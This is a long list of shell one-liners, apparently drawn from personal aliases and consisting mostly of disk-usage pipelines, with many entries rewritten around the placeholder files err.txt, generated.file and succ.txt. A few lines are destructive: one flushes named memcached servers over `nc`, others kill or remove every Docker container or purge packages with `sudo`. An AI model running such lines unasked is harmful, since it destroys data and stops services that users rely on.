echo -n 'ifconfig' && ifconfig |head|tail -n1 && echo 'from ssh : ' $SSH_CONNECTION
echo -n '\e[1;32mJournal Errors:\e[0m ' | pv -qL 10 && journalctl -b -p err | ccze -A
echo -n 'YOUR_REAL_PASSWORD' | iconv -t utf16le | openssl md4
echo -n 'Memory free: ' && memory_pressure |tail -1|cut -d' ' -f5
echo -n 'Current Branch: '; git branch | grep \* | cut -d ' ' -f2
echo -n '( ͡° ͜ʖ ͡°)' | tee /dev/tty | pbcopy
echo -n $dir_index_chomp |perl -pi -e 's; ;\\\ ;g' | pbcopy
echo -n $dir_index_chomp |perl -p -e 's; ;\\\ ;g' | pbcopy
echo -n $PWD | xsel --clipboard --input; echo -n $PWD | xsel -i
echo -n $(git tag | tail -1) | pbcopy
echo -n $(echo -n beauhoyt | shasum -a 256 | cut -c 1-39)
echo -e `tail -n 1 error.log | underscore extract type | xargs`
echo -e 'geola\napixel-website\nkogit' | dmenu | startup
echo -e '\a' || (echo -e '\a'; sleep 1; echo -e '\a')
echo -e '/proc/meminfo:\n';grep --color=auto '^[Mem|Swap]*[Free|Total]*:' /proc/meminfo && echo -e '\nfree -m:'; free -m
echo -e ${PATH//:/\\n} | uniq | cat -n
echo -e ${PATH//:/\\n} | sort | uniq
echo -e ${MANPATH//:/\\n} | uniq | cat -n
echo -e ${LD_LIBRARY_PATH//:/\\n} | uniq | cat -n
echo 'sinfo -l | grep idle'; sinfo -l | grep idle
echo 'reload zshrc...' && source ~/.zshrc && return 0 || return 1
echo 'mount | grep lustre';mount | grep lustre
echo 'flush_all' | nc memcached01.qa.globoi.com 10006 && echo 'flush_all' | nc memcached02.qa.globoi.com 10006
echo 'cpu temp is: $(sensors -u | grep -i temp1_input | cut -d : -f 2)°C'
echo 'What a trippy typo...' | lolcat -p 1 -a -s 50 && ls | lolcat -p 1 -a -s 50 -S 10
echo 'Running: ps aux | grep '; ps aux | grep
echo 'Removing Exited Container(s)' ; docker ps -qf 'status=exited' | xargs docker rm ; echo 'Removing Dangling Image(s)' ; docker images -qf 'dangling=true' | xargs docker rmi
echo 'Killing Container(s)' ; docker ps -q | xargs docker kill ; echo 'Removing Container(s)' ; docker ps -aq | xargs docker rm
echo 'Checking the networks......';ping -c2 www.baidu.com &>/dev/null&&echo Network is OK.||echo Network is not working.
echo '-----------------------------------------------50|-------------------72|'
echo '-------'; and git branch|grep -v master|grep -v qa; and echo '-------'
echo '** Running PHP Tests...' && cd ~/git/eol;rake solr:start;cd ~/git/eol_php_code; php tests/run_tests.php | tee ~/p | grep '^Exception '
echo '* Starting the Pow server...' && launchctl unload '$HOME/Library/LaunchAgents/cx.pow.powd.plist' 2>/dev/null || true && launchctl load -Fw '$HOME/Library/LaunchAgents/cx.pow.powd.plist' 2>/dev/null
echo ' > /dev/null 2>&1' | tr -d '\n'| xsel -b && echo 'copied!'
echo ${line/*home/\/home} | sed ""s/:\([0-9]\+\).*/:\1/"" | read fn
echo ${PATH} | tr -s ':' '\n' | uniq
echo ${MANPATH} | tr -s ':' '\n' | uniq
echo $RANDOM | sha256sum |cut -c1-7
echo $RANDOM | md5sum | cut -b $((($RANDOM % 5) + 1))-$((($RANDOM % 5) + 27))
echo $RANDOM | md5 | cut -b $((($RANDOM % 5) + 1))-$((($RANDOM % 5) + 27))
echo $PWD | tr -d \n | pbcopy
echo $PATH | xargs -d: -n 1 echo | sort
echo $PATH | tr ':' '\n' | xargs -n 1 ls -1
echo $PATH | tr ':' '\n' | sort -u
echo $PATH | tr ':' '\n' | sort
echo $PATH | tr ':' '\n' | nl
echo $PATH | tr ':' '\n' | grep -x -c >/dev/null
echo $PATH | tr ':' '\n' | grep -x -c
echo $PATH | sed s/:/\\n/g | less
echo $PATH | sed 's/\:/\n/g' | sort
echo $PATH | sed 's/:/\\`echo -e '\n\r'`/g' | cat
echo $DOCKER_HOST | cut -d ':' -f2 | cut -b3-
echo $? | grep -E '^0|200$' > /dev/null
echo $1 | nc whois.internic.net 43 | sed
echo $1 | base64 | pbcopy
echo $* | tr % = | nkf -WwmQ
echo $* | nkf -WwMQ | tr = %
echo $(pwd) | tr -d '\n' | pbcopy; echo \
echo $(ls -t) | awk '{print $1}'| xargs tail -f
echo $(kubectl get pods --all-namespaces -o wide | grep keystone-api | awk '{print $7}')
echo $(ifconfig en0|grep 'inet '| awk '{ print $2}')
echo $(head -c 100 /dev/urandom | base64 | head -c 12)
echo $(docker ps | grep -v CONTAINER | awk '{ print $1}')
echo $(docker images | grep none | awk '{ print $3}')
echo $(cat /dev/urandom | tr -dc _A-Z-a-z-0-9 | head -c32)
echo $(\alias | \grep 'alias ndtrx' | cut -f2 -d\')
echo $(($(ps aux|grep Chrome|awk '{s+=$6}END{print s}')/1e6))
ec2-describe-volumes | grep $1 | cut -f3
ec1 | ec2 | ec3
ec `find . | grep -v .git | peco`
eb logs | tail +0 | egrep -ia error
e -v '(^#|^$|^[[:space:]]+#)'
duh | sort -rn | head -20
duckduckgo-query | extract-title | prompt-next
du1 |grep M |sort -n
du1 |grep G |sort -n
du1 | grep [0-9]G | sort -n
du |sort -nr | head
du | sort -rh | less
du | sort -r -n | more
du | sort -n -r | more
du ./ -b | sort -rn | numfmt --to=iec --suffix=B --padding=5
du -xsm err.txt generated.file succ.txt | sort -n | awk '{ printf(\
du -xm -d 1 | sort -nr | head -30
du -xh --max-depth=2 | sort -rh | less
du -xcms *|sort -rn|head -11
du -xb err.txt generated.file succ.txt | funnel -k[i -o0 desc] | head
du -xa -BMB --max-depth=3 . 2>/dev/null | sort -nr | head -n 60
du -x | sort -nr | head -12
du -x | sort -nr | head -10
du -x . | sort -n | tail -50
du -x -m . | sort -nr | head -n 100
du -x -m -d 2 -a /usr/share --time | sort -n -r | head -n 30
du -x -d1|sort -rn|awk -F / -v c=\$COLUMNS 'NR==1{t=\$1} NR>1{r=int(\$1/t*c+.5); b=\
du -x --block-size=1048576 | sort -nr|head
du -x --block-size=1024K | sort -nr | head
du -sxm *|sort -nr|head
du -sxh --block-size=1024K err.txt generated.file succ.txt | sort -nr | head -10
du -sx err.txt generated.file succ.txt |sort -k1 -n -r|head
du -smh *|sort -n|tail
du -sm ./*|sort -n|tail
du -sm ./err.txt ./generated.file ./succ.txt | sort -n | tail
du -sm ./err.txt ./generated.file ./succ.txt 2>/dev/null|sort -n|tail
du -sm *|sort -rn|head
du -sm *|sort -n|tail
du -sm err.txt generated.file succ.txt | sort -nr | more
du -sm err.txt generated.file succ.txt | sort -nr | head -n 20
du -sm err.txt generated.file succ.txt | sort -nr | head -15
du -sm err.txt generated.file succ.txt | sort -n | tail
du -skc -- err.txt generated.file succ.txt | sort -n | hr -k
du -skc err.txt generated.file succ.txt | sort -rn | more
du -sk | sort -n | perl -ne
du -sk /var/log/alternatives.log /var/log/apt /var/log/bootstrap.log /var/log/btmp /var/log/dpkg.log /var/log/faillog /var/log/fontconfig.log /var/log/lastlog /var/log/nginx /var/log/tallylog /var/log/wtmp | sort -r -n | head -10
du -sk .??* | sort -n | perl -ne
du -sk ./err.txt ./generated.file ./succ.txt | sort -n | awk 'BEGIN{ pref[1]=\
du -sk ./err.txt ./generated.file ./succ.txt | sort -n | awk
du -sk ./err.txt ./generated.file ./succ.txt | sort --n | perl -ne
du -sk -- err.txt generated.file succ.txt | sort -n | perl -pe '@SI=qw(K M G T P); s:^(\d+?)((\d\d\d)*)\s:.
du -sk */ | sort -n | tail -n 50
du -sk err.txt generated.file succ.txt | sort -rn | more
du -sk err.txt generated.file succ.txt | sort -rn | head -10
du -sk err.txt generated.file succ.txt | sort -rn | head
du -sk err.txt generated.file succ.txt | sort -nr | perl -ne
du -sk err.txt generated.file succ.txt | sort -nr | head -n 10
du -sk err.txt generated.file succ.txt | sort -nr | head -10
du -sk err.txt generated.file succ.txt | sort -nr | head
du -sk err.txt generated.file succ.txt | sort -nr | awk -F'\\t' '{h=\\
du -sk err.txt generated.file succ.txt | sort -n | tail -50
du -sk err.txt generated.file succ.txt | sort -n | tail -10
du -sk err.txt generated.file succ.txt | sort -n | perl -ne
du -sk $(ls -A) | sort -rn | head -10
du -sk $(/bin/ls -A) | sort -rn | head -10
du -shm err.txt generated.file succ.txt | sort -n | tail
du -shk err.txt generated.file succ.txt | sort -nr | head -10
du -shcx (|.)* | sort -h
du -shc err.txt generated.file succ.txt | sort -rh | more
du -sh | sort -nr | more
du -sh | sort -h | tail
du -sh node_modules/* | sort -h -r | head -n 15
du -sh .[!.]* | sort -n | h -ni 'G\t' 'K\t' 'M\t'
du -sh .[!.]* ./err.txt ./generated.file ./succ.txt | sort -h | tail
du -sh .[!.]* err.txt generated.file succ.txt | sort -rh | head -10
du -sh ./err.txt ./generated.file ./succ.txt | sort -nr | head -n 10
du -sh ./err.txt ./generated.file ./succ.txt | sort -hr | head -n 30
du -sh */* | grep log | grep G
du -sh err.txt generated.file succ.txt | sort -rn | head
du -sh err.txt generated.file succ.txt | sort -rh | head -n 25
du -sh err.txt generated.file succ.txt | sort -rh | head -n 20
du -sh err.txt generated.file succ.txt | sort -rh | head -10
du -sh err.txt generated.file succ.txt | sort -rh | head
du -sh err.txt generated.file succ.txt | sort -nr | head -n10
du -sh err.txt generated.file succ.txt | sort -nr | head
du -sh err.txt generated.file succ.txt | sort -n | more
du -sh err.txt generated.file succ.txt | sort -n | h -ni 'G\t' 'K\t' 'M\t'
du -sh err.txt generated.file succ.txt | sort -k1,1rn | head"
du -sh err.txt generated.file succ.txt | sort -hr | head -n 10
du -sh err.txt generated.file succ.txt | gsort -h | tail -n15
du -sh err.txt generated.file succ.txt | gsort -h | less
du -sh err.txt generated.file succ.txt | gsort -h | h G M
du -sh err.txt generated.file succ.txt 2>/dev/null | sort -rh | head -n 15
du -sh err.txt generated.file succ.txt .??* | sort -h | less -S -E -F -R -X
du -sh $(du -s err.txt generated.file succ.txt | sort -k1n | ruby -nae
du -sckx err.txt generated.file succ.txt | sort -nr | column -t
du -sckx err.txt generated.file succ.txt | sort -nr | awk
du -schx ./err.txt ./generated.file ./succ.txt ./.[a-zA-Z0-9]* | sort -h | tee dush.txt
du -sch .i[!.]* err.txt generated.file succ.txt |sort -rh |head -10
du -sch .[!.]* err.txt generated.file succ.txt |sort -rh |head -11
du -sch .[!.]* err.txt generated.file succ.txt 2>/dev/null | sort -rh | head -10
du -sch .[!.]* err.txt generated.file succ.txt 2>/dev/null | sort -h | ${MANPAGER}
du -sch -- err.txt generated.file succ.txt | sort -hr | head -n 11
du -sch */ | sort -h | ${MANPAGER}
du -sch $_all_files_glob | sort -h | less -FX
du -sc .[!.]* err.txt generated.file succ.txt |sort -rn |head -11
du -sc err.txt generated.file succ.txt | sort -n | cat -n
du -s ~/* | cut -f1 | spark && du -sch ~/*
du -s ./err.txt ./generated.file ./succ.txt | sort -nr | awk
du -s ./err.txt ./generated.file ./succ.txt | cut -f1 | spark && du -sch ./err.txt ./generated.file ./succ.txt
du -s .*|sort -n|tail
du -s -k -c err.txt generated.file succ.txt | sort -rn | more
du -s -B M err.txt generated.file succ.txt | sort -nr | $PAGER
du -s -B 1M err.txt generated.file succ.txt | sort -nr | less
du -s + | sort -nr | head -n3
du -s *|sort -n|tail
du -s *|sort -nr | head
du -s err.txt generated.file succ.txt | sort -rn | head -n 3
du -s err.txt generated.file succ.txt | sort -nr |head -n3
du -s err.txt generated.file succ.txt | sort -nr | head -n 3
du -s err.txt generated.file succ.txt | sort -nr | head -10
du -s err.txt generated.file succ.txt | sort -nk1 | awk '{if(\$1>1000000){print \$1/1000000\
du -s err.txt generated.file succ.txt | sort -n | tail
du -s err.txt generated.file succ.txt 2>/dev/null | sort -nr | head
du -s $(\ls -A) | sort -g | tail -n10
du -mc | egrep -v '.*/.*/.*' | sort -n
du -max | sort -nr | less
du -mad1 ./ | sort -k1nr | head -n20
du -m | sort -nr | head -n 20
du -m | sort -nr | head -10
du -m . | sort -nr | head -n 100
du -m -d1 ./*|sort -nr|head -10
du -lcks err.txt generated.file succ.txt | sort -rn|head -20
du -k|sort -rn|head -50
du -kx | sort -nr | less' #files sorted by size
du -kx | sort -nr | less
du -kx | grep -v '[a-zA-Z0-9]/' | sort -n
du -kx | ag -v '\./.+/' | sort -rn
du -ksm err.txt generated.file succ.txt |sort -rn |head -20
du -ksh err.txt generated.file succ.txt |sort -rn |head -11
du -kscx (*|.[a-zA-Z0-9_]*) | sort -n
du -ks *|sort -nr|more
du -ks err.txt generated.file succ.txt |sort -rn |head -20
du -ks err.txt generated.file succ.txt | sort -nr | head -10
du -ks err.txt generated.file succ.txt .??* . | sort -n | tail -16
du -khs | sort -n -r | more
du -kh --max-depth=1 | sort -nr | more
du -kd1 | sort -n | perl -ne
du -kc err.txt generated.file succ.txt --max-depth=3 --threshold=500M | sort -nr | head -10
du -kaxh --max-depth=1 | sort -rh | head -10
du -k ~/* | awk '\$1 > 500000' | sort -nr
du -k | sort -rn | less
du -k | sort -nr | more
du -k | sort -n | tail -15
du -k | grep -v './.*\/' | sort -n
du -k -I Library ~/* | awk '\$1 > 500000' | sort -nr
du -k err.txt generated.file succ.txt | sort -nr |head -20
du -k err.txt generated.file succ.txt | sort -nr |head -100
du -k err.txt generated.file succ.txt | sort -n -r | head -n 20
du -k err.txt generated.file succ.txt | awk '$1 > 100000' | sort -nr
du -h|grep G|sort -rn
du -hxa | sort -rh | head -11
du -hx ~ | sort -h | tail -n 20
du -hx . | sort -hr | less
du -hx --max-depth=1 | sort -hr | head
du -hx --max-depth=1 . | sort -rh | head -10
du -hsx err.txt generated.file succ.txt | sort | head -50
du -hsx err.txt generated.file succ.txt | sort -rn | head -10
du -hsx err.txt generated.file succ.txt | sort -rh | head -n10
du -hsx err.txt generated.file succ.txt | sort -rh | head -n 10
du -hsx err.txt generated.file succ.txt | sort -rh | head -n
du -hsx err.txt generated.file succ.txt | sort -rh | head -6
du -hsx err.txt generated.file succ.txt | sort -rh | head -50
du -hsx err.txt generated.file succ.txt | sort -rh | head -5
du -hsx err.txt generated.file succ.txt | sort -rh | head -30
du -hsx err.txt generated.file succ.txt | sort -rh | head -25
du -hsx err.txt generated.file succ.txt | sort -rh | head -20
du -hsx err.txt generated.file succ.txt | sort -rh | head -15
du -hsx err.txt generated.file succ.txt | sort -rh | head -11
du -hsx err.txt generated.file succ.txt | sort -rh | head -10
du -hsx err.txt generated.file succ.txt | sort -rh | head
du -hsm err.txt generated.file succ.txt | sort -hr | head 10
du -hsc err.txt generated.file succ.txt | grep [0-9][MG] | sort -n
du -hs ~/* | sort -nr | head
du -hs /bin /boot /dev /etc /evaluation /g /home /lib /lib64 /media /mnt /opt /pash /proc /qsub.log /root /run /sbin /smoosh /srv /sys /tmp /usr /var | sort -nr | head
du -hs .[^.]* err.txt generated.file succ.txt | sort -h | ccze -A
du -hs ./err.txt ./generated.file ./succ.txt | sort -rh | head -n 5
du -hs */ | sort -hr | head
du -hs err.txt generated.file succ.txt | sort -rh | head -5
du -hs err.txt generated.file succ.txt | sort -rh | head -10
du -hs err.txt generated.file succ.txt | sort -rh | head
du -hs err.txt generated.file succ.txt | sort -r | head -5
du -hs err.txt generated.file succ.txt | sort -hr; printf '%0.s-' {1..35}; echo; du -hs | sed 's/\./[Total]/'
du -hs err.txt generated.file succ.txt | sort -hr | less
du -hs err.txt generated.file succ.txt | sort -h | column -t
du -hs err.txt generated.file succ.txt | gsort -rh | head -10
du -hs err.txt generated.file succ.txt | gsort -hr | head -n 10
du -hd 1 | sort -rh | head
du -hcs .[!.]* */*/*/*/* 2> /dev/null | sort -hr | more
du -hcs .[!.]* */*/*/* 2> /dev/null | sort -hr | more
du -hcs .[!.]* */*/* 2> /dev/null | sort -hr | more
du -hcs .[!.]* */* 2> /dev/null | sort -hr | more
du -hcs .[!.]* err.txt generated.file succ.txt 2> /dev/null | sort -hr | more
du -hcs -BM err.txt generated.file succ.txt | sort -rn | head
du -hcks err.txt generated.file succ.txt | sort -rn|head -11
du -hc -d 0 `ls -trx --hide=log | tr '\n' ' '` | sh
du -hax . | sort -rh | head -10
du -ha | sort -n | grep '[0-9]M'
du -ha . | sort -rh | less
du -ha --max-depth 1 | sort -h | less
du -ha err.txt generated.file succ.txt | sort -rn | head -n 10
du -hS | sort -rh | less
du -hS | sort -n -r | more
du -h ~ | grep '[0-9\.]\+G' | sort -h
du -h | tail -n1 | cut -f1
du -h | sort -rh | head -n 20
du -h | sort -rh | head -20
du -h | sort -n -r |more
du -h | sort -hr | head
du -h | sort -h | tail -n 1000
du -h | sort -h | less +G
du -h | pv | sort -h
du -h | grep ^[0-9]*M | sort -rn
du -h ./ | sort -rh | head -n 1
du -h . | sort -rh | head -$1
du -h . | sort -n -r | head -n 10
du -h . 2>/dev/null | sort -rh | head -n $(expr `tput lines` - 1)
du -h -d1 | sort -h | tac
du -h -d1 . | sort -rh | head -n 20
du -h -d1 . | gsort -rh | head -n 20
du -h -d 1 | sort -rh | less
du -h -d 1 | sort --human --reverse | less
du -h -d 1 | ack '\d+\.?\d+G' | sort -hr
du -h -d 1 2>/dev/null | sort -h -r | head -11
du -h -d 0 '${1}' | tail -n 1 | sed 's/[[:blank:]].*//'
du -h -a | grep \[0-9\]M | sort -n
du -h --max-depth=2 | sort -rh | less
du -h --max-depth=1 || tail -n 1
du -h --max-depth=1 | sort -rh | tee space
du -h --max-depth=1 | sort -rh | less
du -h --max-depth=1 | sort -n | more
du -h --max-depth=1 | sort -hr|head
du -h --max-depth=1 | sort -hr | less
du -h --max-depth=1 | sort -hr | head -13
du -h --max-depth=1 | sort -h | more
du -h --max-depth=1 | sort -h -r | less
du -h --max-depth=1 \!:1 | sort -n | less
du -h --max-depth=1 2>/dev/null |\grep -E '([0-9][0-9]+M|[0-9]+G)'
du -h --max-depth=1 2>/dev/null | sort -r -h | head -n 30
du -h --max-depth=1 2> /dev/null | sort -h -r | head -n20
du -h --max-depth=1 /sbc| sort -n | less
du -h --max-depth=1 /home/mehtavia | sort -n | less
du -h --max-depth 1 |grep M |sort -g
du -h --exclude=./yesterday 2>/dev/null | sort -h | grep -E \
du -h err.txt generated.file succ.txt | sort -rn | head
du -d1 . | sort -rn | numfmt --from-unit=1024 --to=iec-i --suffix=B
du -d1 -BM | sort -n -k1 -r | head
du -d1 -BM err.txt generated.file succ.txt | sort -n -r | head -20
du -d0 -c -h err.txt generated.file succ.txt | sort -hr | head -n 11
du -d 1 | sort -n | awk 'BEGIN {OFMT =
du -d 1 -x | sort -r -n | awk
du -d 1 -h | sort -hr | head -n 11
du -d 1 -h | sort -hr | egrep -v ^0
du -d 1 -h --apparent-size --all | sort -h | tail -n 10
du -d 1 -BM | sort -n -k1 -r | less -XSF
du -d 0 -h err.txt generated.file succ.txt | sort -rh | head -n 20
du -csh .??* |sort -rh |head -11
du -csh err.txt generated.file succ.txt |sort -rh |head -11
du -csh err.txt generated.file succ.txt | sort -rn | head
du -cs -BG err.txt generated.file succ.txt | sort -rn | head
du -cmx --max-depth=1 | sort -nr | head -20
du -cms .[^.]*/ */ | sort -rn | head
du -cms ./err.txt ./generated.file ./succ.txt | sort -rn | head -n 5
du -cms *|sort -rn|head -11
du -cms err.txt generated.file succ.txt |sort -rn |head -11
du -cms err.txt generated.file succ.txt | sort -rn | head
du -cm | sort -nr | head
du -cksh -- err.txt generated.file succ.txt | sort -rh | head -11
du -cksh *|sort -rh|head -11
du -cksh err.txt generated.file succ.txt |sort -rn |head -11
du -cksh err.txt generated.file succ.txt |sort -rn |head -10
du -cksh err.txt generated.file succ.txt | sort -rn|head -11
du -cksh err.txt generated.file succ.txt | sort -rn | head -11
du -cksh err.txt generated.file succ.txt | sort -rn | head -10
du -cksh err.txt generated.file succ.txt | sort -rn | head
du -cksh err.txt generated.file succ.txt | sort -rh | head -11
du -cksh err.txt generated.file succ.txt | sort -rh | head
du -cksh err.txt generated.file succ.txt | sort -nr | head -20
du -cksh err.txt generated.file succ.txt | sort -hr | head -n 5
du -cksh err.txt generated.file succ.txt | sort -hr | head -n 15
du -cksh err.txt generated.file succ.txt | sort -hr | head -n 10
du -cksh err.txt generated.file succ.txt | sort -hr | head -11
du -cksh err.txt generated.file succ.txt | sort -h | tail -n 50
du -cksh err.txt generated.file succ.txt | sort --human-numeric-sort|head -11
du -cksh err.txt generated.file succ.txt | gsort -rh | head -11
du -cks ~/**/* | sort -rn | head -n 20
du -cks | sort -rn | head -11
du -cks . .. err.txt generated.file succ.txt | sort -rn | head -11
du -cks -h err.txt generated.file succ.txt | sort -rh | head
du -cks -BM err.txt generated.file succ.txt | sort -rn | head
du -cks -BM err.txt generated.file succ.txt .??* | sort -rn | head
du -cks -- err.txt generated.file succ.txt | sort -rn | head -11
du -cks -- err.txt generated.file succ.txt | sort -rn | head
du -cks *|sort -rn|head -20
du -cks *|sort -rn|head -11
du -cks *|sort -rn | head
du -cks *| sort -rn | head
du -cks err.txt generated.file succ.txt |sort -rn |head -n11
du -cks err.txt generated.file succ.txt |sort -rn |head -11
du -cks err.txt generated.file succ.txt |sort -rn |head -10
du -cks err.txt generated.file succ.txt | sort -rn|head -11
du -cks err.txt generated.file succ.txt | sort -rn| head -11
du -cks err.txt generated.file succ.txt | sort -rn |head -11
du -cks err.txt generated.file succ.txt | sort -rn | head -n11
du -cks err.txt generated.file succ.txt | sort -rn | head -n10
du -cks err.txt generated.file succ.txt | sort -rn | head -n 11
du -cks err.txt generated.file succ.txt | sort -rn | head -n 10
du -cks err.txt generated.file succ.txt | sort -rn | head -15
du -cks err.txt generated.file succ.txt | sort -rn | head -11
du -cks err.txt generated.file succ.txt | sort -rn | head -10
du -cks err.txt generated.file succ.txt | sort -rn | head
du -cks err.txt generated.file succ.txt | sort -nr | less
du -cks err.txt generated.file succ.txt | sort -nr | head -n 10
du -cks err.txt generated.file succ.txt | sort -nr | head
du -cks err.txt generated.file succ.txt | sort -n | head
du -cks ${1}* | sort -rn | head
du -ckhs .[^.]* |sort -rh | head -20
du -ckhs err.txt generated.file succ.txt | sort -rh | head
du -ckhs err.txt generated.file succ.txt | sort -hr | head -n 10
du -ck | sort -nr | head
du -ck -sh ./err.txt ./generated.file ./succ.txt | sort -hr | head -n10
du -ck --max-depth=1 ./ | sort -rn | head -n 16
du -chsx *(D) | sort -rh | head
du -chsx err.txt generated.file succ.txt | sort -rn | head
du -chsx err.txt generated.file succ.txt | sort -rh | head
du -chs *|sort -hr|head -11
du -chs err.txt generated.file succ.txt | sort -rn | head
du -chs err.txt generated.file succ.txt | sort -rh | head -11
du -chd 2 err.txt generated.file succ.txt | sort -rh | head -20
du -ch | egrep '^\s+?([0-9]+\.?[0-9]+?[G]|[789][0-9]{2}[M])'
du -ch 2> /dev/null | tail -1 | gawk '{print $1}'
du -ch --max-depth=1 | sort -h; echo 'du -ch --max-depth=1 | sort -h'
du -ch err.txt generated.file succ.txt | sort -rh | head -10
du -cgs err.txt generated.file succ.txt |sort -rn |head -11
du -cBM --max-depth=1 2> >(grep -v 'Permission denied') | sort -n | grep G
du -b | sort -n | numfmt --to=iec --suffix=B --padding=5
du -axh . | sort -nr | head
du -ax | sort -n | tail -n 10
du -akx | sort -n | tail -100
du -ak /var | sort -nru | head -30
du -ak /home | sort -nru | head -30
du -ak . | sort -nru | head -30
du -ak --max-depth 1 . 2>/dev/null | sort -n | perl -ne
du -ahd1| sort -rh | head -11
du -ahd 1 | sort -rh | head
du -ahc --time | sort -nr | less
du -ah ~ | sort -rh | head -20
du -ah | sort -rh | head -n 5
du -ah | sort -rh | head -20
du -ah | sort -r -k1 | head -5
du -ah | sort -n -r | head -n 10
du -ah | sort -hr | head -n 10
du -ah /home | sort -n -r | head -n 15
du -ah . | sort -rn | head -20
du -ah . | sort -rh | head -40
du -ah . | sort -rh | head -20
du -ah . | sort -nr | head
du -ah . | sort -n -r | head -n 5
du -ah . | sort -n -r | head -n $1
du -ah . | sort -h -r | head -n 10
du -ah --max-depth=1 | tail -n 1 | awk '{print \
du -ach | sort -hr | most
du -ach 2>/dev/null | sort -h | less
du -aSh 2>/dev/null | sort -hr | head -n 25
du -aBM 2>/dev/null | sort -nr | headscreen
du -a ~ | sort -n -r | head -n 10
du -a |sort -n -r |head -n 10
du -a | sort -nr | less
du -a | sort -nr | head -n 20
du -a | sort -nr | head -50
du -a | sort -nr | head -30
du -a | sort -n -r | less
du -a | sort -n -r | head -n 5
du -a | sort -n -r | head -n 20
du -a | sort -n -r | head -n 10
du -a | awk '{print \$2}' | grep
du -a /var | sort -n -r | head -n 10
du -a /usr | sort -n -r | head -n 20
du -a /home | sort -n -r | head -n 5
du -a / | sort -n -r | head -n 5
du -a / | sort -n -r | head -n 10
du -a / | sort -n -r | head -10
du -a ./err.txt ./generated.file ./succ.txt | sort -n -r | head -n 10
du -a ./ | sort -n -r | head -n 20
du -a ./ | sort -n -r | head -n 10
du -a . | sort -nr | head -n10
du -a . | sort -nr | head -n +10
du -a . | sort -n -r | less
du -a . | sort -n -r | head -n 5
du -a . | sort -n -r | head -n 20
du -a . | sort -n -r | head -n 10
du -a -h | sort -hr | head -n20
du -a --max-depth=1 | sort -n | awk
du -a --max-depth=1 / | sort -n | awk
du -a err.txt generated.file succ.txt | sort -rn | head
du -a err.txt generated.file succ.txt | sort -r -n | head -10
du -a err.txt generated.file succ.txt | sort -nr | head -10
du -a err.txt generated.file succ.txt | sort -n | sed -Ee 's/^[0-9]+./\
du -a err.txt generated.file succ.txt | sort -n -r | head -n 10' #check top 10 largest folder in current directory
du -a $1 | sort -n -r | head -n 10
du -S|sort -nr|more
du -Sm | sort -rn | less
du -Shc | sort -hr | less
du -Sh | sort -rh | head -n 5
du -Sh | sort -rh | head -n 15
du -Sh | sort -rh | head -n 10
du -Sh | sort -rh | head -5
du -Sh | sort -rh | head -25
du -Sh | sort -n -r |more
du -Sh | sort -n -r | more
du -Sh | sort -n -r | less
du -Sh | sort -hr | head -10
du -Sh 2>/dev/null | sort -h -r | head -n 25
du -Sh . | sort -rh | head -20
du -Sch | sort -n -r | more
du -S |sort -n -r|more
du -S | sort -rn | less
du -S | sort -n -r |more
du -S | sort -n -r |less
du -S | sort -n -r | more
du -S | sort -n -r | less
du -S | sort -n -r | head -n 10
du -S -h -d 1 | sort -n -b | more
du -S -B M | sort -n -r |more
du -S err.txt generated.file succ.txt | sort -nr | head
du -Pscmx err.txt generated.file succ.txt | sort -nr | tee disk_usage.txt
du -Hcks err.txt generated.file succ.txt | sort -rn|head -11
du -BM | sort -n -r | head -n
du -BM -S | sort -n -r |more
du -BG -d1 | sort -hr | head
du --summarize --human-readable ./err.txt ./generated.file ./succ.txt | sort --human-numeric-sort --stable --reverse | bat ---color always --line-range 01:10
du --max-depth=2 -h . | sort -h -r | head -n 20
du --max-depth=1 ~ | cut -f1 | spark && du -ch --max-depth=1 ~
du --max-depth=1 | sort -nr | head
du --max-depth=1 2> /dev/null | sort -nr | head
du --max-depth=1 2> /dev/null | sort -n -r | head -n20
du --max-depth=1 /home/ | sort -n -r | more
du --max-depth=1 -h | sort -hr | head -n 11
du --max-depth=1 -ah 2> /dev/null | sort -hr | head
du --max-depth=1 --block-size=MiB | sort -n -r | head -25
du --max-depth=0 | sort -rh | head -5
du --max-depth 1 | sort -rh | head
du --inodes -d 3 | sort -rh | less
du --inodes -S | sort -rh | less
du --exclude=.git -L -h --max-depth=1 2>/dev/null |\grep -E '([0-9][0-9]+M|[0-9]+G)'
du --dereference --max-depth=2 -h . | sort -h -r | head -n 20
du - s err.txt generated.file succ.txt | sort - nr | head - 3
du err.txt generated.file succ.txt | sort -gr | less
du err.txt generated.file succ.txt -cks | sort -r -n | head -12
du $* | sort -nr | less
dscl . -read $HOME JPEGPhoto | tail -1 | xxd -r -p > $HOME/profile_pic.jpg
drush pm-list --status=enabled --pipe | grep '_ui' | xargs drush pm-disable '{}' -y
drush pm-list --status=disabled --pipe | grep '_ui' | xargs drush pm-enable '{}' -y
dps | awk 'END {print $1}' | xargs docker stop
dpkg-query -Wf 'x \${Installed-Size} \${Package} \${Status}\n' | sed -ne '/^x /d' -e '/^x \(.*\) install ok installed$/s//\1/p' | sort -nr
dpkg-query --show --showformat='\${Package;-50}\t\${Installed-Size} \${Status}\n' | sort -k 2 -n |grep -v deinstall
dpkg -l|grep ^ii|awk '{printf \
dpkg -l | grep ^rc | awk
dpkg -l | grep ^ii | cut -d
dpkg -l | grep -e '^rc' | awk '{print \$2}'
dpkg -l | grep -E ^rc | xargs sudo apt-get purge
dpkg -l | grep '^ii' | wc -l
dpkg -l | awk '/Name/{y=1;next}y {print $2}' | sed '/^$/d' > ~/Projects/thin-mint/current_installed/$D.txt
dpkg -l 'linux-*' | sed '/^ii/!d;/'$(uname -r | sed
dpkg --list | awk '{print $2}' | tail -n +6
dpkg --get-selections|grep -v deinstall|grep -i
dpkg --get-selections|grep -v deinstall|cut -f1
dpkg --get-selections | grep install | grep
dpkg --get-selections | grep -v deinstall | sed -e 's/\(.*\)\s*install/\1/'
dpkg --get-selections | grep -v deinstall | more
dpkg --get-selections | grep -v deinstall | less
dpkg --get-selections | grep -v deinstall | grep
dpkg --get-selections | cut -f1 | ack -i
dpkg --get-selections | awk '!/deinstall/{print $1}' | $PAGER
dos2unix | xmllint --format - 2> /dev/null | pygmentize -l xml -f terminal16m -O style=monokai
dos2unix | smaps2line | count
dos2unix | jq -MS . 2> /dev/null | pygmentize -l json -f terminal16m -O style=monokai
dockerps|xargs docker stop&&dockerps|xargs docker rm
dockerkill; dockercleanc || true && dockercleani
dockercleanc || true && dockercleani && dockercleanv
dockercleanc || true && dockercleani
docker_clean_containers || true && docker_clean_images
docker-ps-stopped-noncompose | cut -c-12 | xargs docker rm
docker-pretty-ps 2>/dev/null || docker ps
